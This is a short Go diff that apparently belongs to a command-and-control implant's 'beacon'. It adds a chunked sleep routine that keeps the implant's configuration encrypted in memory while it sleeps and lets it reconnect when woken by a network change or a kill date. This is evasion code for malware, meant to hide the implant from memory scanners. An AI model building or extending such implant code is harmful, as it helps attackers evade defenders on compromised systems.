@@ -69,6 +69,41 @@ func (m *xorOnlyMask) AfterWake() {}
 
 func (m *xorOnlyMask) Name() string { return "xor" }
 
+// sleepMaskChunk bounds how long a masked sleep runs before it observes a
+// pending wake request (network change, ghost transition, kill date). The
+// config buffer stays encrypted across chunks; only the sleep call repeats.
+const sleepMaskChunk = 5 * time.Second
+
+// sleepWithMaskInterruptible is the shared body of the platform sleepWithMask
+// implementations. A single long BeforeSleep would hide a network change until
+// the whole (possibly multi-hour) sleep elapsed; chunking keeps the encrypted
+// window intact while letting the beacon loop reconnect within one chunk.
+func sleepWithMaskInterruptible(d time.Duration) {
+	if d <= 0 {
+		return
+	}
+	activeSleepMask.Encrypt()
+	for d > 0 {
+		chunk := d
+		if chunk > sleepMaskChunk {
+			chunk = sleepMaskChunk
+		}
+		activeSleepMask.BeforeSleep(uintptr(chunk.Milliseconds()))
+		activeSleepMask.AfterWake()
+		d -= chunk
+		if d <= 0 {
+			break
+		}
+		select {
+		case <-beaconWakeCh:
+			activeSleepMask.Decrypt()
+			return
+		default:
+		}
+	}
+	activeSleepMask.Decrypt()
+}
+
 func init() {
 	maskRegistry["config-xor"] = func() SleepMasker { return &basicMask{} }
 	maskRegistry["xor"] = func() SleepMasker { return &xorOnlyMask{} }
